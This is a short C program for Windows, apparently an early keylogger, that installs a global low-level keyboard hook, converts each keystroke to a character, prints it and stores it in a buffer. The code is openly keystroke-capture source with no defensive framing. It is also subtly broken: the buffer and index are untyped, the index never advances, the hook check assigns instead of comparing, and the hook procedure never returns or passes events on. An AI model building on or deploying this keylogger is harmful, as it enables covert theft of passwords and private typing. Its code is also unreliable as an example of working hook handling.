#include <stdio.h>
#include <windows.h>

HHOOK hKeyboardHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	static charBuffer[1024] = {0};

	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
			DWORD vkCode = kbdStruct->vkCode;
			DWORD scanCode = kbdStruct->scanCode;

			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);

			keyboardState[VK_SHIFT] = GetKeyState(VK_SHIFT) & 0x8000;
			keyboardState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x0001;

			WORD asciiCh;
			
			int result = ToAscii(vkCode, scanCode, keyboardState, &asciiCh, 0);
			
			if (result == 1) {
				printf("%c", (char)asciiCh);
				static i = 0;
				charBuffer[i] = asciiCh; // 1024 BYTE BUFFER
			}
			else {
				printf("A special key was pressed.");
			}
		}
	}
}

int main() {

	hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

	if (hKeyboardHook = NULL) {
		printf("The hook could not be set.\n\n");
		return 1;
	}
	
	printf("Keyboard hook installed. Press Ctrl + C to exit.\n\n");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hKeyboardHook);

	return 0;
}